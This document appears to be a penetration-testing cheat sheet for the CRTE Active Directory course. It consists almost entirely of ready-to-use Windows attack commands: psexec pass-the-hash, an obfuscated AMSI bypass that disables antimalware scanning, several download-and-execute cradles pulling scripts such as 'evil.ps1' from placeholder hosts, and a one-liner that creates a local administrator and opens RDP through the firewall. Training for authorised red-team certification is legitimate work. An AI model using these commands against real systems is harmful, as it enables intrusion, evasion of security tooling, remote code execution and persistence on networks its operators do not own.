# CRTE-Cheatsheet
Currently copied from CRTP-cheatsheet but will add more!

# Summary
* [General](#General)
* [Domain Enumeration](#Domain-Enumeration.md) 
* [Local privilege escalation](#Local-privilege-escalation)
* [Lateral Movement](#Lateral-Movement)
* [Domain privilege escalation](#Domain-privilege-escalation)
* [Domain Persistence](#Domain-Persistence)
   
# General
#### Access C disk of a computer (check local admin)
```
ls \\<computername>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<naam>"
```

#### Impacket PSexec impacket
If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
```
python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
```

#### AMSI Bypass
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
```

#### Download and execute cradle
```
iex (New-Object Net.WebClient).DownloadString('https://xx.xx.xx.xx/payload.ps1')

$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://xx.xx.xx.xx/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

#PSv3 onwards

iex (iwr 'http://xx.xx.xx.xx/evil.ps1')

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://xx.xx.xx.xx/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://xx.xx.xx.xx/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

### Add user to local admin and RDP group and enable RDP on firewall
```
net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
